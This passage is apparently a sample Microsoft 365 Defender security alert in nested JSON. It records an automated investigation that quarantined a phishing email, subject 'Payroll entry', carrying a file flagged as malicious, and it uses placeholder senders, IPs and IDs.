gory\":null,\"UserAgentTags\":null,\"RawEventData\":{\"Actions\":[],\"CreationTime\":\"2023-09-29T11:40:30Z\",\"Data\":\"{\\\"Version\\\":\\\"3.0\\\",\\\"VendorName\\\":\\\"Microsoft\\\",\\\"ProviderName\\\":\\\"OATP\\\",\\\"AlertType\\\":\\\"44444444-4444-4444-4444-444444444444\\\",\\\"StartTimeUtc\\\":\\\"2023-09-29T09:07:30.656729Z\\\",\\\"EndTimeUtc\\\":\\\"2023-09-29T09:07:30.656729Z\\\",\\\"TimeGenerated\\\":\\\"2023-09-29T09:29:39.09Z\\\",\\\"ProcessingEndTime\\\":\\\"2023-09-29T11:36:50.0093899Z\\\",\\\"Status\\\":\\\"Resolved\\\",\\\"Severity\\\":\\\"Informational\\\",\\\"ConfidenceLevel\\\":\\\"Unknown\\\",\\\"ConfidenceScore\\\":1.0,\\\"IsIncident\\\":false,\\\"ProviderAlertId\\\":\\\"99999999-9999-9999-9999-999999999999\\\",\\\"SystemAlertId\\\":null,\\\"CorrelationKey\\\":\\\"33333333-3333-3333-3333-333333333333\\\",\\\"Investigations\\\":[{\\\"$id\\\":\\\"1\\\",\\\"Id\\\":\\\"urn:ZappedFileInvestigation:13e4f3241b8e49faa8c8adcdb3d620dd\\\",\\\"InvestigationStatus\\\":\\\"FullyRemediated\\\"}],\\\"InvestigationIds\\\":[\\\"urn:ZappedFileInvestigation:13e4f3241b8e49faa8c8adcdb3d620dd\\\"],\\\"Intent\\\":\\\"Probing\\\",\\\"ResourceIdentifiers\\\":[{\\\"$id\\\":\\\"2\\\",\\\"AadTenantId\\\":\\\"55555555-5555-5555-5555-555555555555\\\",\\\"Type\\\":\\\"AAD\\\"}],\\\"AzureResourceId\\\":null,\\\"WorkspaceId\\\":null,\\\"WorkspaceSubscriptionId\\\":null,\\\"WorkspaceResourceGroup\\\":null,\\\"AgentId\\\":null,\\\"AlertDisplayName\\\":\\\"Email messages containing malicious file removed after delivery\\\",\\\"Description\\\":\\\"Emails with malicious file that were delivered and later removed -V2.2.2.2\\\",\\\"ExtendedLinks\\\":[{\\\"Href\\\":\\\"https://security.microsoft.com/viewalerts?id=99999999-9999-9999-9999-999999999999\\\",\\\"Category\\\":null,\\\"Label\\\":\\\"alert\\\",\\\"Type\\\":\\\"webLink\\\"}],\\\"Metadata\\\":{\\\"CustomApps\\\":null,\\\"GenericInfo\\\":null},\\\"Entities\\\":[{\\\"$id\\\":\\\"3\\\",\\\"Files\\\":[{\\\"$id\\\":\\\"4\\\",\\\"Name\\\":\\\"pix.png\\\",\\\"FileHashes\\\":[{\\\"$id\\\":\\\"5\\\",\\\"Algorithm\\\":\\\"SHA256\\\",\\\"Value\\\":\\\"EC7D1FD05AE26420DE1E51F2F315E07F9A4AF5A4A81AD43BDDE7C70EF45ADE68\\\",\\\"Type\\\":\\\"filehash\\\"}],\\\"Type\\\":\\\"file\\\",\\\"MalwareFamily\\\":\\\"Malicious Payload\\\"}],\\\"Recipient\\\":\\\"john.doe@example.com\\\",\\\"Threats\\\":[\\\"ZapPhish\\\",\\\"HighConfPhish\\\"],\\\"Sender\\\":\\\"malicous@organization.com\\\",\\\"P1Sender\\\":\\\"malicious@organization.com\\\",\\\"P1SenderDomain\\\":\\\"organization.com\\\",\\\"SenderIP\\\":\\\"1.1.1.1\\\",\\\"P2Sender\\\":\\\"malicious@organization.com\\\",\\\"P2SenderDisplayName\\\":\\\"Payroll\\\",\\\"P2SenderDomain\\\":\\\"organization.com\\\",\\\"ReceivedDate\\\":\\\"2023-09-28T22:07:30\\\",\\\"NetworkMessageId\\\":\\\"11111111-1111-1111-1111-333333333333\\\",\\\"InternetMessageId\\\":\\\"<11111111-1111-1111-1111-111111111111@organization.com>\\\",\\\"Subject\\\":\\\"Doom shared a file \\\\\\\"Payroll entry\\\\\\\" with you.\\\",\\\"AntispamDirection\\\":\\\"Inbound\\\",\\\"DeliveryAction\\\":\\\"Blocked\\\",\\\"ThreatDetectionMethods\\\":[\\\"FileReputation\\\"],\\\"Language\\\":\\\"en\\\",\\\"DeliveryLocation\\\":\\\"Quarantine\\\",\\\"OriginalDeliveryLocation\\\":\\\"Inbox\\\",\\\"PhishConfidenceLevel\\\":\\\"High\\\",\\\"AdditionalActionsAndResults\\\":[\\\"OriginalDelivery: [N/A]\\\",\\\"Zap: [Success: Message moved to quarantine]\\\"],\\\"AuthDetails\\\":[{\\\"Name\\\":\\\"SPF\\\",\\\"Value\\\":\\\"Pass\\\"},{\\\"Name\\\":\\\"DKIM\\\",\\\"Value\\\":\\\"Pass\\\"},{\\\"Name\\\":\\\"DMARC\\\",\\\"Value\\\":\\\"Pass\\\"},{\\\"Name\\\":\\\"Comp Auth\\\",\\\"Value\\\":\\\"pass\\\"}],\\\"SystemOverrides\\\":[],\\\"Type\\\":\\\"mailMessage\\\",\\\"Urn\\\":\\\"urn:MailEntity:11111111111111111111111111111111\\\",\\\"Source\\\":\\\"OATP\\\",\\\"FirstSeen\\\":\\\"2023-09-29T09:44:12\\\"},{\\\"$id\\\":\\\"6\\\",\\\"MailboxPrimaryAddress\\\":\\\"john.doe@example.com\\\",\\\"Upn\\\":\\\"john.doe@example.com\\\",\\\"AadId\\\":\\\"66666666-6666-6666-6666-666666666666\\\",\\\"RiskLevel\\\":\\\"None\\\",\\\"Type\\\":\\\"mailbox\\\",\\\"Urn\\\":\\\"urn:UserEntity:11111111111111111111111111111111\\\",\\\"Source\\\":\\\"OATP\\\",\\\"FirstSeen\\\":\\\"2023-09-29T09:44:12\\\"},{\\\"$id\\\":\\\"7\\\",\\\"Name\\\":\\\"pix.png\\\",\\\"FileHashes\\\":[{\\\"$id\\\":\\\"8\\\",\\\"Algorithm\\\":\\\"SHA256\\\",\\\"Value\\\":\\\"EC7D1FD05AE26420DE1E51F2F315E07F9A4AF5A4A81AD43BDDE7C70EF45ADE68\\\",\\\"Type\\\":\\\"filehash\\\"}],\\\"Type\\\":\\\"file\\\",\\\"MalwareFamily\\\":\\\"\\\",\\\"Urn\\\":\\\"urn:FileEntity:11111111111111111111111111111111\\\",\\\"Source\\\":\\\"OATP\\\",\\\"FirstSeen\\\":\\\"2023-09-29T09:44:12\\\"},{\\\"$id\\\":\\\"9\\\",\\\"NetworkMessageIds\\\":[\\\"11111111-1111-1111-1111-444444444444\\\"],\\\"CountByThreatType\\\":{\\\"HighConfPhish\\\":1,\\\"Phish\\\":0,\\\"Malware\\\":0,\\\"Spam\\\":0},\\\"CountByProtectionStatus\\\":{\\\"Blocked\\\":1},\\\"CountByDeliveryLocation\\\":{\\\"Quarantine\\\":1},\\\"Query\\\":\\\"( (( (BodyFingerprintBin1:\\\\\\\"4011247127\\\\\\\") ) AND ( (SenderIp:\\\\\\\"1.1.1.1\\\\\\\") ) AND ( (ContentType: 1) )) AND NOT(XmiInfoTenantPolicyFinalVerdictSource:PhishEdu) AND NOT(XmiInfoTenantPolicyFinalVerdictSource:SecOps))\\\",\\\"QueryTime\\\":\\\"2023-09-29T10:14:35.7365899Z\\\",\\\"MailCount\\\":1,\\\"IsVolumeAnamoly\\\":false,\\\"ClusterGroup\\\":\\\"BodyFingerprintBin1,SenderIp\\\",\\\"Type\\\":\\\"mailCluster\\\",\\\"ClusterBy\\\":\\\"BodyFingerprintBin1;SenderIp;ContentType\\\",\\\"ClusterByValue\\\":\\\"4011247127;1.1.1.1;1\\\",\\\"Urn\\\":\\\"urn:MailClusterEntity:11111111111111111111111111111111\\\",\\\"Source\\\":\\\"OATP\\\",\\\"FirstSeen\\\":\\\"2023-09-29T10:15:27\\\"},{\\\"$id\\\":\\\"10\\\",\\\"NetworkMessageIds\\\":[\\\"22222222-2222-2222-2222-222222222222\\\"],\\\"CountByThreatType\\\":{\\\"HighConfPhish\\\":1,\\\"Phish\\\":0,\\\"Malware\\\":0,\\\"Spam\\\":0},\\\"CountByProtectionStatus\\\":{\\\"Blocked\\\":1},\\\"CountByDeliveryLocation\\\":{\\\"Quarantine\\\":1},\\\"Query\\\":\\\"( ((AttachmentFileHash:\\\\\\\"7H0f0FriZCDeHlHy8xXgf5pK9aSoGtQ73efHDvRa3mg=\\\\\\\") AND (ContentType: 1)) AND NOT(XmiInfoTenantPolicyFinalVerdictSource:PhishEdu) AND NOT(XmiInfoTenantPolicyFinalVerdictSource:SecOps))\\\",\\\"QueryTime\\\":\\\"2023-09-29T10:14:35.7365899Z\\\",\\\"MailCount\\\":1,\\\"IsVolumeAnamoly\\\":false,\\\"ClusterGroup\\\":\\\"FileHashThreatIndicator\\\",\\\"Type\\\":\\\"mailCluster\\\",\\\"ClusterBy\\\":\\\"AttachmentFileHash;ContentType\\\",\\\"ClusterByValue\\\":\\\"22222222222222222222222222222222222222222222;1\\\",\\\"Urn\\\":\\\"urn:MailClusterEntity:44444444444444444444444444444444\\\",\\\"Source\\\":\\\"OATP\\\",\\\"FirstSeen\\\":\\\"2023-09-29T10:15:27\\\"},{\\\"$id\\\":\\\"11\\\",\\\"NetworkMessageIds\\\":[\\\"22222222-2222-2222-2222-222222222222\\\"],\\\"CountByThreatType\\\":{\\\"HighConfPhish\\\":1,\\\"Phish\\\":0,\\\"Malware\\\":0,\\\"Spam\\\":0},\\\"CountByProtectionStatus\\\":{\\\"Blocked\\\":1},\\\"CountByDeliveryLocation\\\":{\\\"Quarantine\\\":1},\\\"Query\\\":\\\"( (( (Subject:\\\\\\\"Doom shared a file \\\\\\\"\\\\\\\"Payroll entry\\\\\\\"\\\\\\\" with you.\\\\\\\") ) AND ( (P2SenderDomain:\\\\\\\"organization.com\\\\\\\") ) AND ( (AntispamDirection:\\\\\\\"1\\\\\\\") ) AND ( (ContentType: 1) )) AND NOT(XmiInfoTenantPolicyFinalVerdictSource:PhishEdu) AND NOT(XmiInfoTenantPolicyFinalVerdictSource:SecOps))\\\",\\\"QueryTime\\\":\\\"2023-09-29T10:14:35.7365899Z\\\",\\\"MailCount\\\":1,\\\"IsVolumeAnamoly\\\":false,\\\"ClusterGroup\\\":\\\"Subject,P2SenderDomain,AntispamDirection\\\",\\\"Type\\\":\\\"mailCluster\\\",\\\"ClusterBy\\\":\\\"Subject;P2SenderDomain;AntispamDirection;ContentType\\\",\\\"ClusterByValue\\\":\\\"Doom shared a file \\\\\\\"Payroll entry\\\\\\\" with you.;organization.com;1;1\\\",\\\"Urn\\\":\\\"urn:MailClusterEntity:11111111111111111111111111111111\\\",\\\"Source\\\":\\\"OATP\\\",\\\"FirstSeen\\\":\\\"2023-09-29T10:15:27\\\"},{\\\"$id\\\":\\\"12\\\",\\\"NetworkMessageIds\\\":[\\\"88888888-8888-8888-8888-888888888888\\\"],\\\"CountByThreatType\\\":{\\\"HighConfPhish\\\":1,\\\"Phish\\\":0,\\\"Malware\\\":0,\\\"Spam\\\":0},\\\"CountByProtectionStatus\\\":{\\\"Blocked\\\":1},\\\"CountByDeliveryLocation\\\":{\\\"Quarantine\\\":1},\\\"Query\\\":\\\"( (( (BodyFingerprintBin1:\\\\\\\"4011247127\\\\\\\") ) AND ( (P2SenderDomain:\\\\\\\"organization.com\\\\\\\") ) AND ( (ContentType: 1) )) AND NOT(XmiInfoTenantPolicyFinalVerdictSource:PhishEdu) AND NOT(XmiInfoTenantPolicyFinalVerdictSource:SecOps))\\\",\\\"QueryTime\\\":\\\"2023-09-29T10:14:35.7365899Z\\\",\\\"MailCount\\\":1,\\\"IsVolumeAnamoly\\\":false,\\\"ClusterGroup\\\":\\\"BodyFingerprintBin1,P2SenderDomain\\\",\\\"Type\\\":\\\"mailCluster\\\",\\\"ClusterBy\\\":\\\"BodyFingerprintBin1;P2SenderDomain;ContentType\\\",\\\"ClusterByValue\\\":\\\"4011247127;organization.com;1\\\",\\\"Urn\\\":\\\"urn:MailClusterEntity:4d298ccfc6e344df8a199c74a5466290\\\",\\\"Source\\\":\\\"OATP\\\",\\\"FirstSeen\\\":\\\"2023-09-29T10:15:28\\\"},{\\\"$id\\\":\\\"13\\\",\\\"NetworkMessageIds\\\":[\\\"77777777-7777-7777-7777-777777777777\\\"],\\\"CountByThreatType\\\":{\\\"HighConfPhish\\\":1,\\\"Phish\\\":0,\\\"Malware\\\":0,\\\"Spam\\\":0},\\\"CountByProtectionStatus\\\":{\\\"Blocked\\\":1},\\\"CountByDeliveryLocation\\\":{\\\"Quarantine\\\":1},\\\"Query\\\":\\\"( (( (Subject:\\\\\\\"Doom shared a file \\\\\\\"\\\\\\\"Payroll entry\\\\\\\"\\\\\\\" with you.\\\\\\\") ) AND ( (SenderIp:\\\\\\\"1.1.1.1\\\\\\\") ) AND ( (AntispamDirection:\\\\\\\"1\\\\\\\") ) AND ( (ContentType: 1) )) AND NOT(XmiInfoTenantPolicyFinalVerdictSource:PhishEdu) AND NOT(XmiInfoTenantPolicyFinalVerdictSource:SecOps))\\\",\\\"QueryTime\\\":\\\"2023-09-29T10:14:35.7365899Z\\\",\\\"MailCount\\\":1,\\\"IsVolumeAnamoly\\\":false,\\\"ClusterGroup\\\":\\\"Subject,SenderIp,AntispamDirection\\\",\\\"Type\\\":\\\"mailCluster\\\",\\\"ClusterBy\\\":\\\"Subject;SenderIp;AntispamDirection;ContentType\\\",\\\"ClusterByValue\\\":\\\"Doom shared a file \\\\\\\"Payroll entry\\\\\\\" with you.;1.1.1.1;1;1\\\",\\\"Urn\\\":\\\"urn:MailClusterEntity:cb4c1a4b96883fbdb1dad10b231cfa00\\\",\\\"Source\\\":\\\"OATP\\\",\\\"FirstSeen\\\":\\\"2023-09-29T10:15:28\\\"}],\\\"LogCreationTime\\\":\\\"2023-09-29T11:36:50.0093899Z\\\",\\\"MachineName\\\":\\\"DBAEUR03BG403\\\",\\\"SourceTemplateType\\\":\\\"Threat_Single\\\",\\\"Category\\\":\\\"ThreatManagement\\\",\\\"SourceAlertType\\\":\\\"System\\\"}\",\"DeepLinkUrl\":\"https://security.microsoft.com/mtp-investigation/urn:ZappedFileInvestigation:13e4f3241b8e49faa8c8adcdb3d620dd\",\"EndTimeUtc\":\"2023-09-29T11:34:37Z\",\"Id\":\"11111111-1111-1111-1111-222222222222\",\"InvestigationId\":\"urn:ZappedFileInvestigation:13e4f3241b8e49faa8c8adcdb3d620dd\",\"InvestigationName\":\"Mail with malicious file is zapped - urn:ZappedFileInvestigation:13e4f3241b8e49faa8c8adcdb3d620dd\",\"InvestigationType\":\"ZappedFileInvestigation\",\"LastUpdateTimeUtc\":\"2023-09-29T10:54:43Z\",\"ObjectId\":\"11111111-1111-1111-1111-222222222222\",\"Operation\":\"AirInvestigationData\",\"OrganizationId\":\"55555555-5555-5555-5555-555555555555\",\"RecordType\":64,\"RunningTime\":6762,\"StartTimeUtc\":\"2023-09-29T09:44:07Z\",\"Status\":\"Remediated\",\"UserId\":\"AirInvestigation\",\"UserKey\":\"AirInvestigation\",\"UserType\":4,\"Version\":1,\"Workload\":\"AirInvestigation\"},\"ReportId\":\"60913494_11161_11111111-1111-1111-1111-222222222222\",\"Timestamp\":\"2023-09-29T11:40:30Z\",\"Application\":\"Microsoft 365\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "intrusion_detection"
            ],
            "dataset": "cloud_app_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2023-09-29T11:40:30Z",
        "action": {
            "name": "Publish",
            "properties": {
                "Application": "Microsoft 365",
                "ApplicationId": "11161",
                "IsAdminOperation": "false",
                "IsExternalUser": false,
                "IsImpersonated": false,
                "RawEventData": "{\"Actions\":[],\"CreationTime\":\"2023-09-29T11:40:30Z\",\"Data\":\"{\\\"Version\\\":\\\"3.0\\\",\\\"VendorName\\\":\\\"Microsoft\\\",\\\"ProviderName\\\":\\\"OATP\\\",\\\"AlertType\\\":\\\"44444444-4444-4444-4444-444444444444\\\",\\\"StartTimeUtc\\\":\\\"2023-09-29T09:07:30.656729Z\\\",\\\"EndTimeUtc\\\":\\\"2023-09-29T09:07:30.656729Z\\\",\\\"TimeGenerated\\\":\\\"2023-09-29T09:29:39.09Z\\\",\\\"ProcessingEndTime\\\":\\\"2023-09-29T11:36:50.0093899Z\\\",\\\"Status\\\":\\\"Resolved\\\",\\\"Severity\\\":\\\"Informational\\\",\\\"ConfidenceLevel\\\":\\\"Unknown\\\",\\\"ConfidenceScore\\\":1.0,\\\"IsIncident\\\":false,\\\"ProviderAlertId\\\":\\\"99999999-9999-9999-9999-999999999999\\\",\\\"SystemAlertId\\\":null,\\\"CorrelationKey\\\":\\\"33333333-3333-3333-3333-333333333333\\\",\\\"Investigations\\\":[{\\\"$id\\\":\\\"1\\\",\\\"Id\\\":\\\"urn:ZappedFileInvestigation:13e4f3241b8e49faa8c8adcdb3d620dd\\\",\\\"InvestigationStatus\\\":\\\"FullyRemediated\\\"}],\\\"InvestigationIds\\\":[\\\"urn:ZappedFileInvestigation:13e4f3241b8e49faa8c8adcdb3d620dd\\\"],\\\"Intent\\\":\\\"Probing\\\",\\\"ResourceIdentifiers\\\":[{\\\"$id\\\":\\\"2\\\",\\\"AadTenantId\\\":\\\"55555555-5555-5555-5555-555555555555\\\",\\\"Type\\\":\\\"AAD\\\"}],\\\"AzureResourceId\\\":null,\\\"WorkspaceId\\\":null,\\\"WorkspaceSubscriptionId\\\":null,\\\"WorkspaceResourceGroup\\\":null,\\\"AgentId\\\":null,\\\"AlertDisplayName\\\":\\\"Email messages containing malicious file removed after delivery\\\",\\\"Description\\\":\\\"Emails with malicious file that were delivered and later removed -V2.2.2.2\\\",\\\"ExtendedLinks\\\":[{\\\"Href\\\":\\\"https://security.microsoft.com/viewalerts?id=99999999-9999-9999-9999-999999999999\\\",\\\"Category\\\":null,\\\"Label\\\":\\\"alert\\\",\\\"Type\\\":\\\"webLink\\\"}],\\\"Metadata\\\":{\\\"CustomApps\\\":null,\\\"GenericInfo\\\":null},\\\"Entities\\\":[{\\\"$id\\\":\\\"3\\\",\\\"Files\\\":[{\\\"$id\\\":\\\"4\\\",\\\"Name\\\":\\\"pix.png\\\",\\\"FileHashes\\\":[{\\\"$id\\\":\\\"5\\\",\\\"Algorithm\\\":\\\"SHA256\\\",\\\"Value\\\":\\\"EC7D1FD05AE26420DE1E51F2F315E07F9A4AF5A4A81AD43BDDE7C70EF45ADE68\\\",\\\"Type\\\":\\\"filehash\\\"}],\\\"Type\\\":\\\"file\\\",\\\"MalwareFamily\\\":\\\"Malicious Payload\\\"}],\\\"Recipient\\\":\\\"john.doe@example.com\\\",\\\"Threats\\\":[\\\"ZapPhish\\\",\\\"HighConfPhish\\\"],\\\"Sender\\\":\\\"malicous@organization.com\\\",\\\"P1Sender\\\":\\\"malicious@organization.com\\\",\\\"P1SenderDomain\\\":\\\"organization.com\\\",\\\"SenderIP\\\":\\\"1.1.1.1\\\",\\\"P2Sender\\\":\\\"malicious@organization.com\\\",\\\"P2SenderDisplayName\\\":\\\"Payroll\\\",\\\"P2SenderDomain\\\":\\\"organization.com\\\",\\\"ReceivedDate\\\":\\\"2023-09-28T22:07:30\\\",\\\"NetworkMessageId\\\":\\\"11111111-1111-1111-1111-333333333333\\\",\\\"InternetMessageId\\\":\\\"<11111111-1111-1111-1111-111111111111@organization.com>\\\",\\\"Subject\\\":\\\"Doom shared a file \\\\\\\"Payroll entry\\\\\\\" with you.\\\",\\\"AntispamDirection\\\":\\\"Inbound\\\",\\\"DeliveryAction\\\":\\\"Blocked\\\",\\\"ThreatDetectionMethods\\\":[\\\"FileReputation\\\"],\\\"Language\\\":\\\"en\\\",\\\"DeliveryLocation\\\":\\\"Quarantine\\\",\\\"OriginalDeliveryLocation\\\":\\\"Inbox\\\",\\\"PhishConfidenceLevel\\\":\\\"High\\\",\\\"AdditionalActionsAndResults\\\":[\\\"OriginalDelivery: [N/A]\\\",\\\"Zap: [Success: Message moved to quarantine]\\\"],\\\"AuthDetails\\\":[{\\\"Name\\\":\\\"SPF\\\",\\\"Value\\\":\\\"Pass\\\"},{\\\"Name\\\":\\\"DKIM\\\",\\\"Value\\\":\\\"Pass\\\"},{\\\"Name\\\":\\\"DMARC\\\",\\\"Value\\\":\\\"Pass\\\"},{\\\"Name\\\":\\\"Comp Auth\\\",\\\"Value\\\":\\\"pass\\\"}],\\\"SystemOverrides\\\":[],\\\"Type\\\":\\\"mailMessage\\\",\\\"Urn\\\":\\\"urn:MailEntity:11111111111111111111111111111111\\\",\\\"Source\\\":\\\"OATP\\\",\\\"FirstSeen\\\":\\\"2023-09-29T09:44:12\\\"},{\\\"$id\\\":\\\"6\\\",\\\"MailboxPrimaryAddress\\\":\\\"john.doe@example.com\\\",\\\"Upn\\\":\\\"john.doe@example.com\\\",\\\"AadId\\\":\\\"66666666-6666-6666-6666-666666666666\\\",\\\"RiskLevel\\\":\\\"None\\\",\\\"Type\\\":\\\"mailbox\\\",\\\"Urn\\\":\\\"urn:UserEntity:11111111111111111111111111111111\\\",\\\"Source\\\":\\\"OATP\\\",\\\"FirstSeen\\\":\\\"2023-09-29T09:44:12\\\"},{\\\"$id\\\":\\\"7\\\",\\\"Name\\\":\\\"pix.png\\\",\\\"FileHashes\\\":[{\\\"$id\\\":\\\"8\\\",\\\"Algorithm\\\":\\\"SHA256\\\",\\\"Value\\\":\\\"EC7D1FD05AE26420DE1E51F2F315E07F9A4AF5A4A81AD43BDDE7C70EF45ADE68\\\",\\\"Type\\\":\\\"filehash\\\"}],\\\"Type\\\":\\\"file\\\",\\\"MalwareFamily\\\":\\\"\\\",\\\"Urn\\\":\\\"urn:FileEntity:11111111111111111111111111111111\\\",\\\"Source\\\":\\\"OATP\\\",\\\"FirstSeen\\\":\\\"2023-09-29T09:44:12\\\"},{\\\"$id\\\":\\\"9\\\",\\\"NetworkMessageIds\\\":[\\\"11111111-1111-1111-1111-444444444444\\\"],\\\"CountByThreatType\\\":{\\\"HighConfPhish\\\":1,\\\"Phish\\\":0,\\\"Malware\\\":0,\\\"Spam\\\":0},\\\"CountByProtectionStatus\\\":{\\\"Blocked\\\":1},\\\"CountByDeliveryLocation\\\":{\\\"Quarantine\\\":1},\\\"Query\\\":\\\"( (( (BodyFingerprintBin1:\\\\\\\"4011247127\\\\\\\") ) AND ( (SenderIp:\\\\\\\"1.1.1.1\\\\\\\") ) AND ( (ContentType: 1) )) AND NOT(XmiInfoTenantPolicyFinalVerdictSource:PhishEdu) AND NOT(XmiInfoTenantPolicyFinalVerdictSource:SecOps))\\\",\\\"QueryTime\\\":\\\"2023-09-29T10:14:35.7365899Z\\\",\\\"MailCount\\\":1,\\\"IsVolumeAnamoly\\\":false,\\\"ClusterGroup\\\":\\\"BodyFingerprintBin1,SenderIp\\\",\\\"Type\\\":\\\"mailCluster\\\",\\\"ClusterBy\\\":\\\"BodyFingerprintBin1;SenderIp;ContentType\\\",\\\"ClusterByValue\\\":\\\"4011247127;1.1.1.1;1\\\",\\\"Urn\\\":\\\"urn:MailClusterEntity:11111111111111111111111111111111\\\",\\\"Source\\\":\\\"OATP\\\",\\\"FirstSeen\\\":\\\"2023-09-29T10:15:27\\\"},{\\\"$id\\\":\\\"10\\\",\\\"NetworkMessageIds\\\":[\\\"22222222-2222-2222-2222-222222222222\\\"],\\\"CountByThreatType\\\":{\\\"HighConfPhish\\\":1,\\\"Phish\\\":0,\\\"Malware\\\":0,\\\"Spam\\\":0},\\\"CountByProtectionStatus\\\":{\\\"Blocked\\\":1},\\\"CountByDeliveryLocation\\\":{\\\"Quarantine\\\":1},\\\"Query\\\":\\\"( ((AttachmentFileHash:\\\\\\\"7H0f0FriZCDeHlHy8xXgf5pK9aSoGtQ73efHDvRa3mg=\\\\\\\") AND (ContentType: 1)) AND NOT(XmiInfoTenantPolicyFinalVerdictSource:PhishEdu) AND NOT(XmiInfoTenantPolicyFinalVerdictSource:SecOps))\\\",\\\"QueryTime\\\":\\\"2023-09-29T10:14:35.7365899Z\\\",\\\"MailCount\\\":1,\\\"IsVolumeAnamoly\\\":false,\\\"ClusterGroup\\\":\\\"FileHashThreatIndicator\\\",\\\"Type\\\":\\\"mailCluster\\\",\\\"ClusterBy\\\":\\\"AttachmentFileHash;ContentType\\\",\\\"ClusterByValue\\\":\\\"22222222222222222222222222222222222222222222;1\\\",\\\"Urn\\\":\\\"urn:MailClusterEntity:44444444444444444444444444444444\\\",\\\"Source\\\":\\\"OATP\\\",\\\"FirstSeen\\\":\\\"2023-09-29T10:15:27\\\"},{\\\"$id\\\":\\\"11\\\",\\\"NetworkMessageIds\\\":[\\\"22222222-2222-2222-2222-222222222222\\\"],\\\"CountByThreatType\\\":{\\\"HighConfPhish\\\":1,\\\"Phish\\\":0,\\\"Malware\\\":0,\\\"Spam\\\":0},\\\"CountByProtectionStatus\\\":{\\\"Blocked\\\":1},\\\"CountByDeliveryLocation\\\":{\\\"Quarantine\\\":1},\\\"Query\\\":\\\"( (( (Subject:\\\\\\\"Doom shared a file \\\\\\\"\\\\\\\"Payroll entry\\\\\\\"\\\\\\\" with you.\\\\\\\") ) AND ( (P2SenderDomain:\\\\\\\"organization.com\\\\\\\") ) AND ( (AntispamDirection:\\\\\\\"1\\\\\\\") ) AND ( (ContentType: 1) )) AND NOT(XmiInfoTenantPolicyFinalVerdictSource:PhishEdu) AND NOT(XmiInfoTenantPolicyFinalVerdictSource:SecOps))\\\",\\\"QueryTime\\\":\\\"2023-09-29T10:14:35.7365899Z\\\",\\\"MailCount\\\":1,\\\"IsVolumeAnamoly\\\":false,\\\"ClusterGroup\\\":\\\"Subject,P2SenderDomain,AntispamDirection\\\",\\\"Type\\\":\\\"mailCluster\\\",\\\"ClusterBy\\\":\\\"Subject;P2SenderDomain;AntispamDirection;ContentType\\\",\\\"ClusterByValue\\\":\\\"Doom shared a file \\\\\\\"Payroll entry\\\\\\\" with you.;organization.com;1;1\\\",\\\"Urn\\\":\\\"urn:MailClusterEntity:11111111111111111111111111111111\\\",\\\"Source\\\":\\\"OATP\\\",\\\"FirstSeen\\\":\\\"2023-09-29T10:15:27\\\"},{\\\"$id\\\":\\\"12\\\",\\\"NetworkMessageIds\\\":[\\\"88888888-8888-8888-8888-888888888888\\\"],\\\"CountByThreatType\\\":{\\\"HighConfPhish\\\":1,\\\"Phish\\\":0,\\\"Malware\\\":0,\\\"Spam\\\":0},\\\"CountByProtectionStatus\\\":{\\\"Blocked\\\":1},\\\"CountByDeliveryLocation\\\":{\\\"Quarantine\\\":1},\\\"Query\\\":\\\"( (( (BodyFingerprintBin1:\\\\\\\"4011247127\\\\\\\") ) AND ( (P2SenderDomain:\\\\\\\"organization.com\\\\\\\") ) AND ( (ContentType: 1) )) AND NOT(XmiInfoTenantPolicyFinalVerdictSource:PhishEdu) AND NOT(XmiInfoTenantPolicyFinalVerdictSource:SecOps))\\\",\\\"QueryTime\\\":\\\"2023-09-29T10:14:35.7365899Z\\\",\\\"MailCount\\\":1,\\\"IsVolumeAnamoly\\\":false,\\\"ClusterGroup\\\":\\\"BodyFingerprintBin1,P2SenderDomain\\\",\\\"Type\\\":\\\"mailCluster\\\",\\\"ClusterBy\\\":\\\"BodyFingerprintBin1;P2SenderDomain;ContentType\\\",\\\"ClusterByValue\\\":\\\"4011247127;organization.com;1\\\",\\\"Urn\\\":\\\"urn:MailClusterEntity:4d298ccfc6e344df8a199c74a5466290\\\",\\\"Source\\\":\\\"OATP\\\",\\\"FirstSeen\\\":\\\"2023-09-29T10:15:28\\\"},{\\\"$id\\\":\\\"13\\\",\\\"NetworkMessageIds\\\":[\\\"77777777-7777-7777-7777-777777777777\\\"],\\\"CountByThreatType\\\":{\\\"HighConfPhish\\\":1,\\\"Phish\\\":0,\\\"Malware\\\":0,\\\"Spam\\\":0},\\\"CountByProtectionStatus\\\":{\\\"Blocked\\\":1},\\\"CountByDeliveryLocation\\\":{\\\"Quarantine\\\":1},\\\"Query\\\":\\\"( (( (Subject:\\\\\\\"Doom shared a file \\\\\\\"\\\\\\\"Payroll entry\\\\\\\"\\\\\\\" with you.\\\\\\\") ) AND ( (SenderIp:\\\\\\\"1.1.1.1\\\\\\\") ) AND ( (AntispamDirection:\\\\\\\"1\\\\\\\") ) AND ( (ContentType: 1) )) AND NOT(XmiInfoTenantPolicyFinalVerdictSource:PhishEdu) AND NOT(XmiInfoTenantPolicyFinalVerdictSource:SecOps))\\\",\\\"QueryTime\\\":\\\"2023-09-29T10:14:35.7365899Z\\\",\\\"MailCount\\\":1,\\\"IsVolumeAnamoly\\\":false,\\\"ClusterGroup\\\":\\\"Subject,SenderIp,AntispamDirection\\\",\\\"Type\\\":\\\"mailCluster\\\",\\\"ClusterBy\\\":\\\"Subject;SenderIp;AntispamDirection;ContentType\\\",\\\"ClusterByValue\\\":\\\"Doom shared a file \\\\\\\"Payroll entry\\\\\\\" with you.;1.1.1.1;1;1\\\",\\\"Urn\\\":\\\"urn:MailClusterEntity:cb4c1a4b96883fbdb1dad10b231cfa00\\\",\\\"Source\\\":\\\"OATP\\\",\\\"FirstSeen\\\":\\\"2023-09-29T10:15:28\\\"}],\\\"LogCreationTime\\\":\\\"2023-09-29T11:36:50.0093899Z\\\",\\\"MachineName\\\":\\\"DBAEUR03BG403\\\",\\\"SourceTemplateType\\\":\\\"Threat_Single\\\",\\\"Category\\\":\\\"ThreatManagement\\\",\\\"SourceAlertType\\\":\\\"System\\\"}\",\"DeepLinkUrl\":\"https://security.microsoft.com/mtp-investigation/urn:ZappedFileInvestigation:13e4f3241b8e49faa8c8adcdb3d620dd\",\"EndTimeUtc\":\"2023-09-29T11:34:37Z\",\"Id\":\"11111111-1111-1111-1111-222222222222\",\"InvestigationId\":\"urn:ZappedFileInvestigation:13e4f3241b8e49faa8c8adcdb3d620dd\",\"InvestigationName\":\"Mail with malicious file is zapped - 